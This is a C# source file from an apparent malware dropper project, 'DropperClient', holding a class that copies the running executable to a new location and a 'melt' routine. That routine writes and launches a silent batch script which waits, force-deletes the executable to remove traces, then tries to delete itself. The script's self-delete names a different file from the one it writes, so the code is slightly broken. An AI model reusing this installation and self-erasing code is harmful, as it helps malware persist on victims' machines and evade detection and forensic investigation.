using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace DropperClient.Installation
{
    internal class ExecutableInfo
    {
        public string AssemblyPath { get; }
        public string AssemblyName { get; }

        /// <summary>
        /// Provides functions and properties to get information about the current assembly and move it around.
        /// </summary>
        public ExecutableInfo()
        {
            AssemblyPath = Assembly.GetEntryAssembly().Location;
            AssemblyName = Assembly.GetEntryAssembly().GetName().Name + ".exe";
        }

        /// <summary>
        /// Moves the current assembly to the destination path
        /// </summary>
        /// <param name="destination"></param>
        /// <returns></returns>
        public bool Move(string destination)
        {
            // Return true to tell the program the file has already ben moved / moved succesfully
            // Either way it shouldn't matter
            if (File.Exists(destination)) return true;

            try
            {
                var fileBytes = File.ReadAllBytes(AssemblyPath);
                File.WriteAllBytes(destination, fileBytes);

                return true;
            }
            catch (Exception ex)
            {
                // Todo
                // Write error to log and transmit that log.
                Console.WriteLine(ex.ToString());
            }

            return false;
        }

        /// <summary>
        /// Creates a bat file that deletes the current assembly.
        /// </summary>
        public void StartMelt()
        {
            var batchCommands = string.Empty;
            var exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");

            batchCommands += "@ECHO OFF\n";                         // Do not show any output
            batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
            batchCommands += "echo j | del /F ";                    // Delete the executeable
            batchCommands += exeFileName + "\n";
            batchCommands += "echo j | del deleteMyProgram.bat";    // Delete this bat file

            File.WriteAllText("melt.bat", batchCommands);

            Process.Start("melt.bat");
        }
    }
}